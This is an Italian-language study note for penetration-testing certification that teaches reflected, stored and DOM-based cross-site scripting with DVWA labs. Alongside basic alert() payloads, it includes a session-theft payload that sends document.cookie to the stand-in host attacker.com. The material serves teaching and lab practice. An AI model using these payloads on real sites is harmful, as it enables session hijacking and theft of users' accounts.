# XSS Basics

**Difficolta:** Beginner-Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [02-SQL-Injection-Basics.md](02-SQL-Injection-Basics.md)
**Lab:** DVWA / bWAPP — XSS

---

## Obiettivo

Riconoscere e dimostrare Cross-Site Scripting reflected e stored a livello base, capire l'impatto reale (furto sessione) senza approfondire le evasion avanzate (fuori scope eJPTv2, coperte in eWPT).

---

## Concetti chiave

### Tipi principali

| Tipo | Descrizione | Persistenza |
|------|-------------|-------------|
| Reflected | il payload torna nella risposta immediata (es. parametro di ricerca) | nessuna, serve un link malevolo cliccato dalla vittima |
| Stored | il payload viene salvato dal server (es. commento) e servito a ogni visitatore | persistente finche non viene rimosso |
| DOM-based | il payload viene eseguito da JavaScript lato client senza mai passare dal server | dipende dal codice client |

### Dove si testa

Qualsiasi input che viene riflesso nella pagina: parametri di ricerca, campi commento, nome utente/profilo, messaggi di errore che includono l'input.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Browser DevTools | ispezione manuale | conferma esecuzione script | il metodo piu affidabile per XSS base |
| Burp Repeater | invio payload modificati | risposta HTML completa | utile per vedere se il payload viene filtrato/encodato |

---

## Payload / Esempi

### Esempio 1: reflected XSS su parametro di ricerca

```
http://target.com/search?q=<script>alert(1)</script>
```

**Output atteso:** popup con "1" quando la pagina viene renderizzata dal browser della vittima.

**Spiegazione:** se il parametro `q` viene stampato nell'HTML senza encoding (es. `<div>Risultati per: <script>alert(1)</script></div>`), il browser esegue lo script. E la prova di concetto minima per dimostrare la vulnerabilita.

### Esempio 2: stored XSS su un campo commento

```
Commento: <script>alert(document.cookie)</script>
```

**Spiegazione:** se il campo commento viene salvato e mostrato ad ogni utente che visita la pagina, il payload si esegue per ogni visitatore: impatto molto piu ampio del reflected.

### Esempio 3: impatto reale — furto di sessione (concettuale)

```
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Spiegazione:** questo payload invia il cookie della vittima a un server controllato dall'attaccante; se il cookie di sessione non ha il flag `HttpOnly`, puo essere letto da JavaScript ed esfiltrato, permettendo session hijacking. Da dimostrare solo in lab (mai contro utenti reali senza autorizzazione).

---

## Lab Hands-On

### Lab 1: DVWA — Reflected e Stored XSS (livello low)
**Obiettivo:** dimostrare entrambe le varianti su DVWA
**Difficulty:** Facile
**Time:** 30 min

**Walkthrough breve:**
1. Sul modulo XSS reflected, inserisci `<script>alert(1)</script>` nel campo di ricerca
2. Sul modulo XSS stored, inserisci lo stesso payload in un commento e ricarica la pagina per un altro "utente"
3. Osserva la differenza: reflected serve un link, stored resta attivo per chiunque visiti la pagina

---

## Common Mistakes

- Testare solo `alert(1)` senza capire dove finisce l'input nell'HTML -> a volte serve chiudere un tag/attributo per far eseguire lo script
- Sottovalutare la stored XSS -> impatto molto piu alto del reflected, va sempre segnalata con priorita maggiore

---

## Link Utili

- [PortSwigger Academy — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## Connessioni

- **Prerequisito:** [02-SQL-Injection-Basics.md](02-SQL-Injection-Basics.md)
- **Prossimo Step:** [04-File-Inclusion-Command-Injection.md](04-File-Inclusion-Command-Injection.md)
- **Combinazione con:** [05-Burp-Suite-Basics.md](05-Burp-Suite-Basics.md)

---

## Checklist di padronanza

- [ ] So la differenza tra reflected, stored e DOM-based XSS
- [ ] So dimostrare un XSS di base con un payload alert()
- [ ] Capisco perche una stored XSS ha impatto maggiore di una reflected

---

## Note personali

_(spazio libero)_
